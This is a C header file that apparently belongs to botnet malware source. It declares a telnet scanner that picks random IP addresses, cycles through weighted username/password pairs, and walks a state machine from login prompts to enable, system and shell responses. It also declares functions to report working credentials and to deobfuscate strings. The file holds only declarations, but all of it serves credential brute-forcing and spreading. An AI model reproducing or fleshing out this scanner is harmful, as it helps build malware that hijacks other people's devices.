#pragma once

#include "main.h"

#include <stdint.h>

#define SCANNER_MAX_CONNS   350
#define SCANNER_RAW_PPS     410

#define SCANNER_RDBUF_SIZE  128
#define SCANNER_HACK_DRAIN  32

struct scanner_auth {
    unsigned char *username;
    unsigned char *password;
    uint16_t weight_min, weight_max;
    unsigned char username_len, password_len;
};

struct scanner_connection {
    struct scanner_auth *auth;
    int fd, last_recv;
    enum {
        SC_CLOSED,
        SC_CONNECTING,
        SC_HANDLE_IACS,
        SC_WAITING_USERNAME,
        SC_WAITING_PASSWORD,
        SC_WAITING_PASSWD_RESP,
        SC_WAITING_ENABLE_RESP,
        SC_WAITING_SYSTEM_RESP,
        SC_WAITING_SHELL_RESP,
        SC_WAITING_SH_RESP,
        SC_WAITING_TOKEN_RESP
    } state;
    uint32_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    unsigned char rdbuf[SCANNER_RDBUF_SIZE];
    unsigned char tries;
    unsigned char recv_wo_proc;
};

void scanner_init();
void scanner_kill(void);

static void setup_connection(struct scanner_connection *);
static uint32_t get_random_ip(void);

static int consume_iacs(struct scanner_connection *);
static int consume_any_prompt(struct scanner_connection *);
static int consume_user_prompt(struct scanner_connection *);
static int consume_pass_prompt(struct scanner_connection *);
static int consume_resp_prompt(struct scanner_connection *);

void scanner_add_auth_entry(unsigned char *, unsigned char *);
void scanner_clear_auth_entry(void);
static struct scanner_auth *random_auth_entry(void);
static void report_working(uint32_t, uint16_t, struct scanner_auth *);
static unsigned char *deobf(unsigned char *, int *);
static unsigned char can_consume(struct scanner_connection *, unsigned char *, int);
